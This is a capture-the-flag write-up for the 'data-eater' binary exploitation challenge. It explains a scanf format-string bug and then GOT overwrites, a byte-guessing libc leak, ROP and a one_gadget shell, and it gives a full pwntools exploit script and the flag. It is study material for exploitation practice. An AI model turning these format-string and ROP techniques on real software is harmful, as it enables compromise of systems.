# data-eater

## Challenge

We are given only a binary and a port to connect to.
No libc, dockerfile, or any information about the challenge environment is provided.

We can send input to the challenge, but we get to response.

Most inputs result in a segfault:

```
user@ctf [12:23:28 PM] [~/challenges/data-eater] [master]
-> % ./dataeater 
a
a
a
[1]    980251 segmentation fault (core dumped)  ./dataeater
user@ctf [12:34:13 PM] [~/challenges/data-eater] [master]
-> % ./dataeater
asdsa
asddas
[1]    980279 segmentation fault (core dumped)  ./dataeater
```

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

NOTE: this is an unintended solution.
The intended solution does not use ROP or the leaks used here.

The author's writeup can be found [here](https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#pwndata-eater).

More information about this technique can be found in this presentation:
[How the ELF Ruined Christmas](https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico).
([pdf](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf))

### Analyzing main

Let's start by decompiling the `main` function:

```c
undefined8 main(undefined8 argc, char **argv, char **envp)

{
    undefined8 uVar1;
    int64_t in_FS_OFFSET;
    char **var_28h;
    char **var_20h;
    int64_t var_14h;
    int64_t var_8h;
    
    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);
    var_20h = argv;
    while (var_28h = envp,  *var_20h != NULL) {
        *var_20h = NULL;
        var_20h = var_20h + 1;
    }
    while (*var_28h != NULL) {
        *var_28h = NULL;
        var_28h = var_28h + 1;
    }
    var_14h._0_4_ = (undefined4)argc;
    sym.imp.fgets((int64_t)&var_14h + 4, 8, _reloc.stdin);
    sym.imp.__isoc99_scanf((int64_t)&var_14h + 4, obj.buf);
    sym.imp.memset(obj.buf, 0, 0x20);
    segment.GNU_STACK = (code)0x0;
    uVar1 = 0;
    if (var_8h != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar1 = sym.imp.__stack_chk_fail();
    }
    return uVar1;
}
```

The program starts by clearing all arguments and environment variables.

Then it allows us to write 8 bytes to a local variable using `fgets`.

The result of this is used as the format string for a `scanf` call immediately after.

It then uses `memset` to set 0x20 bytes of `obj.buf` to NULL.

Lastly, the program forces a segfault by dereferencing a nullptr.

### Controlling RIP using a format string vulnerability

Right away, we can see that there is a format string vulnerability, since we are given control
over the first argument to `scanf`.

Having control over the first argument of `scanf` means we can write anything we want.
However, we need pointers to the addresses we want to write to.
The program already sets the second argument to `obj.buf` for us, so we can always write here.
But to take control of RIP, we need to write to the stack.

Let's take a look at the stack and registers before the call to `scanf`:

```
pwndbg> regs
*RAX  0x0
 RBX  0x400730 (__libc_csu_init) ◂— push   r15
*RCX  0x6022a2 ◂— 0x0
*RDX  0x0
 RDI  0x7fffffffe310 ◂— 0x7fffff000a61 /* 'a\n' */
*RSI  0x601080 (buf) ◂— 0x0
*R8   0x7fffffffe310 ◂— 0x7fffff000a61 /* 'a\n' */
*R9   0x7ffff7fa8a60 (main_arena+96) —▸ 0x6026a0 ◂— 0x0
*R10  0x77
*R11  0x246
 R12  0x400560 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7fffffffe320 ◂— 0x0
 RSP  0x7fffffffe2f0 ◂— 0x0
*RIP  0x4006e6 (main+159) ◂— call   0x400550
pwndbg> tel 20
00:0000│ rsp    0x7fffffffe2f0 ◂— 0x0
... ↓           2 skipped
03:0018│        0x7fffffffe308 ◂— 0x100400560
04:0020│ rdi r8 0x7fffffffe310 ◂— 0x7fffff000a61 /* 'a\n' */
05:0028│        0x7fffffffe318 ◂— 0xf5aabcff8380a700
06:0030│ rbp    0x7fffffffe320 ◂— 0x0
07:0038│        0x7fffffffe328 —▸ 0x7ffff7e0fb25 (__libc_start_main+213) ◂— mov    edi, eax
08:0040│        0x7fffffffe330 —▸ 0x7fffffffe418 ◂— 0x0
09:0048│        0x7fffffffe338 ◂— 0x100000064 /* 'd' */
0a:0050│        0x7fffffffe340 —▸ 0x400647 (main) ◂— push   rbp
0b:0058│        0x7fffffffe348 ◂— 0x1000
0c:0060│        0x7fffffffe350 —▸ 0x400730 (__libc_csu_init) ◂— push   r15
0d:0068│        0x7fffffffe358 ◂— 0xf9b4fcb593ba6350
0e:0070│        0x7fffffffe360 —▸ 0x400560 (_start) ◂— xor    ebp, ebp
0f:0078│        0x7fffffffe368 ◂— 0x0
... ↓           2 skipped
12:0090│        0x7fffffffe380 ◂— 0x64b034a55da6350
13:0098│        0x7fffffffe388 ◂— 0x64b1374660e6350
```

Fortunately for us, R8 is pointing at the format string buffer (the one we wrote to using `fgets`).
This is essential as the allotted 8 bytes is extremely restrictive.

Using a format string that allows us to read more than 8 bytes, we can extend the format string
in the middle of the `scanf` call.
This way, `scanf` will continue to process any new conversion specifiers we want.

Our format string looks like this:

```py
fmt = "%4${}c".format(24 + len(ropchain)).encode()
```

which allows us to read exactly the number of characters required for our main payload.

The rest of the payload looks like this:

```py
payload = flat({
    0: fmt,
    0x8: b"%12$p%4c",
    0x10: pack(exe.got['memset']) + ropchain,
    }, filler=b' ')
```

We start by overwriting the format string with itself.
This is not strictly necessary, but can be useful when debugging as the format string appears the
same before and after this write.
It also ensures that your new data doesn't overlap with the original format string, which would
cause `scanf` to ignore part of it.

The next line is our new format string, which is used to set up any reads needed for the primary
ropchain.
This includes overwriting the got entry of `memset`, which we put on the stack, to replace it
with a `leave; ret;` gadget, allowing us to enter our ropchain and avoid the nullptr dereference
and canary.
It also uses the fact that the first argument is set to `obj.buf` to write some format strings
we can use in our ropchain for more `scanf` calls.

```
overwrites = flat([
    hex(rop.find_gadget(['leave', 'ret'])[0]).encode(),
    b"%2c\x00%16c\x00",
    ])
```

We use this to create 2 format strings:

- One writes 2 bytes to a given address, useful for partially overwriting GOT entries.
- The other reads 16 bytes to a given address, useful for everything else, including building
  ropchains and writing more format strings.

NOTE: ret2dlresolve would be ideal here, as we have no ASLR leaks or libc version, but PIE is
off and the binary is only using partial RELRO.
Unfortunately, the `.text` section is likely too far from writiable data for this attack to work.
This is because the linker attempts to write to the GOT when resolving symbols.
If we try a ret2dlresolve here, the linker attempts to write to an unwritable region of memory and
the program segfaults.

### Leaking the libc version

To use partial GOT overwrites and ret2libc, we need to determine the libc version on the server.

This is complicated by the fact that we have no leaking functions in the binary.

Originally, I considered using ROP gadgets to try leaking a libc address 1 bit at a time.
The idea was that leaking the least significant byte should be enough to narrow down the possible
versions significantly.
With enough leaks, we could use a libc database to find the exact libc version.
The problem with this approach was that I was limited by the gadgets in the binary.
I couldn't find a way to set up a conditional jump with registers I controlled.
I also couldn't easily dereference a pointer and store the value in a register.

Our solution lies in the behaviour of `scanf`.
When scanf reaches characters that are not conversion specifiers, the characters must match
exactly, otherwise it will return.
If we pass a GOT address as our first pointer, it will interpret the libc address as the expected
string.
If we send a correct character, it will continue to read input as long as our inputs match.
If we send a different character, `scanf` will return.
We can use this boolean condition to leak the least significant bytes of functions in the GOT that
have already been resolved.
In our case, `fgets` and `scanf` can be leaked.

We can adapt our payload from above to test our guesses for the LSB of `fgets`:

```py
rop = ROP(exe)

rop.raw(rop.find_gadget(['ret'])[0])
rop.call('__isoc99_scanf', [exe.got['fgets']])

ropchain = flat(rop.chain(), length=128)

fmt = "%4${}c".format(24 + len(ropchain)).encode()

payload = flat({
    0: fmt,
    0x8: b"%12$p%4c",
    0x10: pack(exe.got['memset']) + ropchain,
    }, filler=b' ')

info("Payload size: " + str(len(payload)))

overwrites = flat([
    hex(rop.find_gadget(['leave', 'ret'])[0]).encode(),
    " %{}c".format(8).encode(),
    ])

print(overwrites)
fgets_guess = ""

for i in range(0x30, 0x100, 0x10):
    print("*** TRYING FGETS {} ***".format(hex(i)))
    io = start()
    io.send(fmt)
    io.send(payload)
    io.send(overwrites)
    io.send(p8(i))

    try:
        io.recv(1, timeout=2)
        io.close()
        fgets_guess = hex(i)
        break
    except:
        io.close()
```

We start at 0x30 because, for the functions we're leaking, we know this byte won't be 0x00 and
because 0x10 and 0x20 are special characters that don't get interpreted the same way.

The loop for `scanf` is pretty much the same as the one for `fgets`.

When both finish, we can print the results:

```py
print("FGETS: " + fgets_guess)
print("SCANF: " + scanf_guess)
```

and we get the following values:

```
FGETS: 0xc0
SCANF: 0xe0
```

If we plug these into a libc database like
[libc.blukat.me](https://libc.blukat.me/?q=fgets%3Ac0%2C__isoc99_scanf%3Ae0)
we find that the server is running libc version 2.31.

### Leaking the libc address

Unfortunately, the above method requires the program terminating on incorrect guesses, as it's
the only feedback we can get at this stage.

Having the libc version means we can look for function close to the existing GOT entries.
Using this, we can start to look for functions we can use to leak an address.
This would allow us to build a standard ret2libc ropchain and spawn a shell.

The 2 functions resolved so far are `fgets` and `scanf`.
`memset` can also be resolved, but it's address is not close to any other useful functions that I
could find.

I originally focused on functions near `fgets`, because I wanted to avoid overwriting `scanf`
since it was needed to create the next ropchain after a leak.
`puts` seemed like an ideal candidate, as it was close enough that I only needed a 4-bit
bruteforce and it was a pretty standard function for ret2libc leaks.
I tested the exploit locally with a Docker container that I set up to match the libc version.

Confusingly, I got no output from the testing server when I successfully called `puts`.
I experimented a little and found out that this was due to the buffering of `stdout`.

Using `_IO_flush_all`, it was possible flush the output of my leak.
However, this function was only rarely accessible using a LSB overwrite of the `fgets` GOT entry.
The problem was that in all cases where `_IO_flush_all` was accessible, `puts` would not be.

I tried a few other `_IO_*` functions to see what worked and what didn't.
Any function that printed to a file or stream was off limits as I would need the correct pointer.
Any function that used `stdout` was also off limits unless I could cause it to flush.
Functions which used file descriptors were ideal, as `stdout` was just `int fd = 0`.

In hindsight, it might have been possible to flush the `stdout` family using a very large input.

I then came across the `vdprintf` function, which was also accessible from `fgets`.
The function is similar to `vfprintf`, except that it uses a file descriptor instead of a stream.
This seemed perfect, but when I tested it I would segfault because I could not set up a `va_list`
argument for the call.

Branching off of `vdprintf`, I looked at `dprintf`.
This function is analogous to `fprintf` and does not require a 3rd `va_list` argument.
The problem was, this function was accessible through `scanf`, meaning I would lose my arbitrary
write primitive.

Still, I was able to replace `__isoc99_scanf` with `dprintf` and leak a libc address.
The format string had to be set up in advance and the address we wanted to leak from had to be
placed on the stack along with our ropchain, as we lose control once we replaced these functions.

### Restoring the arbitrary write primitive

I was limited with what I could do using `dprintf`.
I would have to restore my write primitive to make use of the peak.

Since we already bruteforced the missing nibble in our 2-byte overwrite, we know exactly what to
write to restore the GOT entry to `scanf`.
The original function was actually `__isoc99_scanf`, but it doesn't really matter for our purposes whether we use this or `scanf`.

In addition to adding a format string and address for our leak, we also need a format string for
restoring `scanf`.
Since we already have our guess, we can generate the format string ahead of the function switch.
We also have to make the call in our ropchain and place the GOT address on the stack.
Once this is all set up, calling `scanf` (now `dprintf`) with this format string will restore
`scanf`.

### Getting a shell

Now that we have a leak and an arbitrary write, we can use ret2libc to spawn a shell.

To write the remainder of the ropchain, we can use `scanf` to write gadgets into the data section.
We then pivot onto the data section of the binary and begin executing our new ropchain.
This pivot has to be set up in advance as well, so it executes at the end of the first stage.

I set up the standard `pop rdi; ret; &"/bin/sh"; system;` ropchain to spawn a shell.
However, the shell would always close with an error immediately after forking.

I realised that this was because `system` used a shell to interpret the command.
Since environment variables were cleared at the start of `main`, `system` didn't know what shell
to use.

As a side note, `system` had a 1/16 chance of being accessible from a 2-byte overwrite of `scanf`,
which would have eliminated the need to restore our write primitive.
I originally tried this method, but it did not work for the same reason.

Instead of `system`, we can use `execve`, which is a bit more restrictive in terms of what
registers need to be controlled, but does not rely on a shell or environment variables.

I replaced my final rop gadgets with a ropchain that set R12 and R13 to NULL to satisfy a
one\_gadget condition, then wrote the address of the one\_gadget on the new ropchain.

This exploit does still rely on a 4-bit bruteforce to get the address of `dprintf`, but it works
reliably once this condition is met.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31869 dataeater
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('dataeater')
libc = ELF('libc6_2.31-17_amd64.so')

if args.LOCAL:
    libc = ELF('/usr/lib/libc-2.33.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31869)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

if args.LEAK:
    rop = ROP(exe)

    rop.raw(rop.find_gadget(['ret'])[0])
    rop.call('__isoc99_scanf', [exe.got['fgets']])

    ropchain = flat(rop.chain(), length=128)

    fmt = "%4${}c".format(24 + len(ropchain)).encode()

    payload = flat({
        0: fmt,
        0x8: b"%12$p%4c",
        0x10: pack(exe.got['memset']) + ropchain,
        }, filler=b' ')

    info("Payload size: " + str(len(payload)))

    overwrites = flat([
        hex(rop.find_gadget(['leave', 'ret'])[0]).encode(),
        " %{}c".format(8).encode(),
        ])

    print(overwrites)
    fgets_guess = ""

    for i in range(0x30, 0x100, 0x10):
        print("*** TRYING FGETS {} ***".format(hex(i)))
        io = start()
        io.send(fmt)
        io.send(payload)
        io.send(overwrites)
        io.send(p8(i))

        try:
            io.recv(1, timeout=2)
            io.close()
            fgets_guess = hex(i)
            break
        except:
            io.close()

    rop = ROP(exe)

    rop.raw(rop.find_gadget(['ret'])[0])
    rop.call('__isoc99_scanf', [exe.got['__isoc99_scanf']])

    ropchain = flat(rop.chain(), length=128)

    payload = flat({
        0: fmt,
        0x8: b"%12$p%4c",
        0x10: pack(exe.got['memset']) + ropchain,
        }, filler=b' ')

    scanf_guess = ""

    for i in range(0x30, 0x100, 0x10):
        print("*** TRYING SCANF {} ***".format(hex(i)))
        io = start()
        io.send(fmt)
        io.send(payload)
        io.send(overwrites)
        io.send(p8(i))

        try:
            io.recv(1, timeout=2)
            io.close()
            scanf_guess = hex(i)
            break
        except:
            io.close()

    print("FGETS: " + fgets_guess)
    print("SCANF: " + scanf_guess)

one_gadget = 0xcbd1d
guess_base = libc.sym['dprintf'] & 0xfff
print(hex(guess_base))

restore_base = libc.sym['scanf'] & 0xfff

rop = ROP(exe)

data = 0x601e00
leakstr = data + 0x0
resetstr = data + 0x10

fakestack = data - 0x100

rop.call('__isoc99_scanf', [exe.sym['buf']+4, leakstr])

rop.call('__isoc99_scanf', [exe.sym['buf']+4, resetstr])

rop.call('__isoc99_scanf', [exe.sym['buf'], exe.got['__isoc99_scanf']])

rop.call('__isoc99_scanf', [1, leakstr])

rop(r14 = exe.got['fgets'])
rop.raw(rop.ret)

rop.call('__isoc99_scanf', [1, resetstr])

rop(r14 = exe.got['__isoc99_scanf'])
rop.raw(rop.ret)

rop.call('__isoc99_scanf', [exe.sym['buf']+4, fakestack])

rop(r12 = 0, r13 = 0)

rop.migrate(fakestack)

ropchain = flat(rop.chain(), length=512)
print(rop.dump())

fmt = "%4${}c".format(24 + len(ropchain)).encode()

payload = flat({
    0: fmt,
    0x8: b"%12$p%9c",
    0x10: pack(exe.got['memset']) + ropchain,
    }, filler=b' ')

info("Payload size: " + str(len(payload)))

overwrites = flat([
    hex(rop.find_gadget(['leave', 'ret'])[0]).encode(),
    b"%2c\x00%16c\x00",
    ])

print(overwrites)

guesses = [*range(0x0, 0x10)]
print(guesses)

i = 0
while True:
    io = start()

    #pause()

    io.send(fmt)
    io.send(payload)
    io.send(overwrites)
    guess_guess = guess_base | (0x1000 * guesses[i % len(guesses)])
    print("*** TRYING {} ***".format(hex(guess_guess)))
    io.send(b'<><%5$s><>%5$p-\x00')
    io.send("%{}c%5$hn"
            .format(restore_base | (0x1000 * guesses[i % len(guesses)]))
            .ljust(15, '-')
            .encode() + b'\x00')
    io.send(p16(guess_guess))

    try:
        io.recvuntil(b"<><")
        leak = io.recvuntil(b"><>", drop=True)
        print(leak)
        libc.address = unpack(leak.ljust(8, b'\x00')) - libc.sym['fgets']

        io.success("LIBC: " + hex(libc.address))
        io.send(pack(libc.address + one_gadget) + pack(0))

        #io.interactive()
        #break

        out = io.recv(8, timeout=2)
        print(out)
        io.interactive()
        io.close()
        break
    except:
        io.close()

    i += 1
```

## Flag

```
dice{1nfin1t3_f1v3_lin3_ch4lls_f46297a09e671c6a}
```
